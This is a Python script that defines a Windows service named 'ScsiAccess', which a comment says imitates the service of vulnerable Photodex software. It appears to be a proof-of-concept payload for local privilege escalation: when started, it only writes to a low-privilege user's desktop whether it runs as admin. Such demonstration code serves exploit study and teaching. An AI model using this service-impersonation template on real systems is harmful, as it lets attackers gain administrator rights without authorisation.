#!/user/bin/python

import servicemanager
import win32serviceutil
import win32service
import win32api


import os
import ctypes


# Part 2 - Here (in service class) we define the action to do when we got a service manager signal 

class Service(win32serviceutil.ServiceFramework):
    
    _svc_name_ = 'ScsiAccess' # specify the service name and the display name - note that the name scsiacces is similar tothe orginal one for photodex vulnerable software
    _svc_display_name_ = 'ScsiAccess'

    
    def __init__(self, *args): # Initialize ServiceFramework and we define in functions style what to do when we got a service manager signal
        win32serviceutil.ServiceFramework.__init__(self, *args)
        
        
    def sleep(self, sec): # if the service manager singal was pause - then we sleep for an amount of seconds
        win32api.Sleep(sec*1000, True)
        
    def SvcDoRun(self): # if the signal was start - then:-

        self.ReportServiceStatus(win32service.SERVICE_START_PENDING) # tell the Service Manager that we are planing to run the serivce via reporting back a start pending status
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING) #tell the Service Manager that we are currently running up the service then call the start
                                                                   #function (start) if any exception happened, we will call the stop function (SvcStop)
            self.start()            
           
        except Exception, x:
            self.SvcStop()
   
            
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) #tell the Service Manager that we are planing to stop the serivce
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPED) #tell the Service Manager that we are currently stopping the service
        
    def start(self):
        self.runflag=True # mark a service status flag as True and we will Wait in while loop for receiving service stop signal from the service manager


        f = open('C:/Users/lowpriv/Desktop/priv.txt','w')
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            f.write('[-] We are NOT admin! ')
        else:
            f.write('[+] We are admin :)')
        f.close()

        

        
        while self.runflag:  # Wait for service stop signal
            self.sleep(10)
                
    def stop(self):  # now within the stop function we mark the service status flag as Flase to break the while loop in the start function
         self.runflag=False



# Part 1 - initializing : in this section we:-
if __name__ == '__main__':
    
    servicemanager.Initialize() # define a listener for win servicemanager
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service) #pass a Service class handler, so whenver we got a signal from the servicemanager we will pass it to the Service class

